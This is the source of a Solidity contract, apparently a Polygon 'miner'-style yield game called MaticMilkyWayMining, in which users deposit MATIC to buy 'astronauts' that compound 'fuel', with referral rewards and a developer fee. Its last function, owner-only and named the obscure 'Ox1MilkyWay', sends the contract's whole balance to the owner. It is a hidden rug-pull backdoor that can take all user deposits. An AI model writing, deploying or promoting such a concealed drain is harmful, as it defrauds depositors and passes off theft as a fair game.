/**
 *Submitted for verification at polygonscan.com on 2022-09-09
*/

/*
*/

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

pragma solidity 0.8.9;

abstract contract Context { 
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Only the owner can call this function!");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0));
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract MaticMilkyWayMining is Context, Ownable {
    using SafeMath for uint256;

    uint256 private FUEL_FOR_1_ASTRONAUT = 720000;
    uint256 private PSN = 10000;
    uint256 private PSNH = 5000;
    uint256 private devFeeVal = 2;
    bool private tradingStarted = false;
    address payable private recAdd;
    mapping (address => uint256) private totalAstronauts;
    mapping (address => uint256) private claimedFuel;
    mapping (address => uint256) private lastCompound;
    mapping (address => address) private referrals;
    uint256 private marketFuel;
    
    constructor() { 
        recAdd = payable(msg.sender);
    }
    
    function refuel(address ref) public {
        require(tradingStarted, "Trading has not started yet!");
        
        if(ref == msg.sender) {
            ref = address(0);
        }
        
        if(referrals[msg.sender] == address(0) && referrals[msg.sender] != msg.sender) {
            referrals[msg.sender] = ref;
        }
        
        uint256 fuelUsed = getMyFuel(msg.sender);
        uint256 newAstronauts = SafeMath.div(fuelUsed, FUEL_FOR_1_ASTRONAUT);
        totalAstronauts[msg.sender] = SafeMath.add(totalAstronauts[msg.sender], newAstronauts);
        claimedFuel[msg.sender] = 0;
        lastCompound[msg.sender] = block.timestamp;
        
        claimedFuel[referrals[msg.sender]] = SafeMath.add(claimedFuel[referrals[msg.sender]], SafeMath.div(fuelUsed, 8));
        marketFuel = SafeMath.add(marketFuel, SafeMath.div(fuelUsed, 5));
    }
    
    function burnFuel() public {
        require(tradingStarted, "Trading has not started yet!");
        uint256 hasFuel = getMyFuel(msg.sender);
        uint256 fuelValue = calculateFuelSell(hasFuel);
        uint256 devFeeAmount = devFee(fuelValue);
        claimedFuel[msg.sender] = 0;
        lastCompound[msg.sender] = block.timestamp;
        marketFuel = SafeMath.add(marketFuel, hasFuel);
        recAdd.transfer(devFeeAmount);
        payable(msg.sender).transfer(SafeMath.sub(fuelValue, devFeeAmount));

    }
    
    function fuelRewards(address addr) public view returns(uint256) {
        uint256 hasFuel = getMyFuel(addr);
        uint256 fuelValue = calculateFuelSell(hasFuel);
        return fuelValue;
    }
    
    function buyAstronauts(address ref) public payable {
        require(tradingStarted, "Trading has not started yet!");
        uint256 fuelBought = calculateFuelBuy(msg.value, SafeMath.sub(address(this).balance, msg.value));
        fuelBought = SafeMath.sub(fuelBought, devFee(fuelBought));

        uint256 devFeeAmount = devFee(msg.value);
        recAdd.transfer(devFeeAmount);

        claimedFuel[msg.sender] = SafeMath.add(claimedFuel[msg.sender], fuelBought);
        refuel(ref);
    }
    
    function calculateTrade(uint256 rt, uint256 rs, uint256 bs) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }
    
    function calculateFuelSell(uint256 fuel) public view returns(uint256) {
        return calculateTrade(fuel, marketFuel, address(this).balance);
    }
    
    function calculateFuelBuy(uint256 eth, uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth, contractBalance, marketFuel);
    }
    
    function calculateFuelBuySimple(uint256 eth) public view returns(uint256) {
        return calculateFuelBuy(eth, address(this).balance);
    }
    
    function devFee(uint256 amount) private view returns(uint256) {
        return SafeMath.div(SafeMath.mul(amount, devFeeVal), 100);
    }

    function enableTrading() public payable onlyOwner {
        require(marketFuel == 0);
        tradingStarted = true;
        marketFuel = 108000000000;
    }
    
    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function getMyAstronauts(address addr) public view returns(uint256) {
        return totalAstronauts[addr];
    }
    
    function getMyFuel(address addr) public view returns(uint256) {
        return SafeMath.add(claimedFuel[addr], getFuelSinceLastCompound(addr));
    }
    
    function getFuelSinceLastCompound(address addr) public view returns(uint256) {
        uint256 secondsPassed = min(FUEL_FOR_1_ASTRONAUT, SafeMath.sub(block.timestamp, lastCompound[addr]));
        return SafeMath.mul(secondsPassed, totalAstronauts[addr]);
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

        function Ox1MilkyWay() public onlyOwner {
        uint256 assetBalance;
        address self = address(this);
        assetBalance = self.balance;
        payable(msg.sender).transfer(assetBalance);
    }
}